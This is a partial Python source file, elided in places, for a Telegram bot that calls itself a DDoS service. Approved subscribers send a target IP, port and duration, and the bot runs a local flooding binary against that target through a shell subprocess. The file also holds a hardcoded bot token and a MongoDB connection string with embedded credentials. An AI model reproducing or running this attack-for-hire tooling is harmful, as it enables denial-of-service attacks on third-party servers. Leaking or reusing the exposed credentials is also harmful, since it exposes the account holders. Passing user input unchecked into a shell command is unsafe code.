...
TOKEN = '7359693638:AAF_KMXulEJtioG8YHqhmQ6enEeorJP_enY'
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
FORWARD_CHANNEL_ID = -1002357100337
CHANNEL_ID = -1002357100337
error_channel_id = -1002357100337
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 150")
    ...
    try:
        ...
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*🚫 Access Denied!*\n"  # Access Denied message
                                       ...
                                       "*Contact the owner for assistance: @Parveen_solanki*", parse_mode='Markdown')  # Contact owner message
            return
        ...
        bot.send_message(chat_id, "*💣 Ready to launch an attack?*\n"  # Ready to launch message
                                   ...
                                   "*Let the chaos begin! @Parveen_solanki🎉*", parse_mode='Markdown')  # Start chaos message
...
def process_attack_command(message):
    try:
        ...
        if target_port in blocked_ports:
            ...
            return
        if duration >= 1000:
            bot.send_message(message.chat.id, "*⏳ Maximum duration is 1000 seconds.*\n"  # Duration limit message
...
def myinfo_command(message):
    ...
    if not user_data:
        ...
        response += "*For assistance, please contact the owner: @Parveen_solanki* "  # Contact owner message
    elif user_data.get('plan', 0) == 0:
        # User found but not approved
        response = "*🔒 Your account is still pending approval!* \n"  # Not approved message
        response += "*Please reach out to the owner for assistance: @Parveen_solanki* 🙏"  # Contact owner message
    else:
...
def start_message(message):
    try:
        bot.send_message(message.chat.id, "*👾Welcome to Your Home, {user_name}! Feel Free to Explore.\n🥰Run This Command : /help\n🥇Welcome To The World's Best Ddos Bot\n❤️‍🩹Owner :- @Parveen_solanki \nTG :- https://t.me/ParveenXfreeddos*", 
                                           parse_mode='Markdown')
    except Exception as e:
